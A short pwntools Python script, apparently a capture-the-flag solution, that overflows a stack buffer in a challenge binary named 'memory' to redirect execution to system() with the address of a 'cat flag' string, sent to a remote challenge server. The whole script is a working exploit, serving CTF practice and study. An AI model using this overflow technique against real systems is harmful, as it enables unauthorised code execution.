from pwn import *
context.log_level = "debug"
p = process('./memory')
p = remote('node5.buuoj.cn',27077)
elf = ELF('./memory')

system_addr = elf.plt['system']
cat_flag = 0x80487e0

payload = b'b'*0x13+b'b'*4 + p32(system_addr) + p32(0x08048677) + p32(cat_flag)

p.sendline(payload)


p.interactive()
